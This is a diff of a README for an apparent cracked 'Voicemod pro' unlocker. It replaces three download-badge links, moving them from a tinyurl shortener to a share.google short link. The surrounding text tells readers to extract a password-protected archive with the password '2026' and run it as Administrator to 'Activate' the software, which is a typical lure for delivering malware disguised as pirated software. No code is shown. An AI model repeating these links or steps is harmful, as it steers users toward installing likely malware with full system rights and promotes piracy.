@@ -9,7 +9,7 @@
 
 <div align="center">
 
-[![Download Voicemod GitHub](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/voicemod-github)
+[![Download Voicemod GitHub](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/8yu1tfIIjaY3yQCvn)
 
 </div>
 
@@ -117,7 +117,7 @@
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Click "Activate" → Launch Voicemod
 
-[![Download Voicemod GitHub](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/voicemod-github)
+[![Download Voicemod GitHub](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/8yu1tfIIjaY3yQCvn)
 
 ### Detailed Instructions (May 2026 Update)
 
@@ -258,7 +258,7 @@ Get full Voicemod pro features for free. **Voicemod GitHub** unlocks 100+ voice 
 
 <div align="center">
 
-[![Download Voicemod GitHub](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/voicemod-github)
+[![Download Voicemod GitHub](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/8yu1tfIIjaY3yQCvn)
 
 **Version 4.6.1** — Free Voicemod pro unlock. May 2026 update. Zero cost. No payment.
 
